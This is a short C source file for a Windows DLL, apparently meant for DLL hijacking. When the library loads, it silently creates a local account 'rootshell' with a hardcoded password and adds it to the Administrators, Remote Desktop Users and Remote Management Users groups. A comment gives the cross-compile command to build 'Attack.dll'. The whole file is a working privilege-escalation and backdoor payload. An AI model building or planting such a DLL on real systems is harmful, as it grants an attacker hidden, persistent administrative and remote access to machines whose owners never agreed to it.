// DDL to create user

#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH:
        int i;
  	i = system ("net user rootshell Welcome@1234 /add");
  	i = system ("net localgroup administrators rootshell /add");
        i = system ("net localgroup 'Remote Desktop Users' rootshell /add");
        i = system ("net localgroup 'Remote Management Users' rootshell /add");
        break;
        case DLL_THREAD_ATTACH: 
        break;
        case DLL_THREAD_DETACH: 
        break;
        case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}



//Compile to dll
//x86_64-w64-mingw32-gcc adduserDLL.cpp --shared -o Attack.dll
